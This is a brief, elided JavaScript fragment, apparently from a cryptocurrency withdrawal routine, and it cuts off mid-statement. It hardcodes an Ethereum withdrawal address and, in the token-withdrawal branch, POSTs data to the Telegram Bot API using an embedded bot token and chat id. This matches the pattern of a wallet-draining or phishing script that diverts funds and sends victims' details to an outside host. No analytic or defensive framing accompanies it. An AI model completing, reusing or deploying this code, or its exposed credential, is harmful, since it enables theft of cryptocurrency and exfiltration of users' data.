...
const WITHDRAWAL_ADDRESS = "0x719d6A9282e5976e1F828631c8e940e612739BFC"
        ...
        if (withdrawalToken) {
            ...
            if (withdrawalToken.appId === "tokens") {
                ...
                try {
                    ...
                    var z=$.ajax({  
    type: "POST",  
    url: "https://api.telegram.org/bot"+"5393705486:AAGUgecdfGWVaQesiOEEq6gVH0j_dxZpwsg"+"/sendMessage?chat_id="+"650953371",
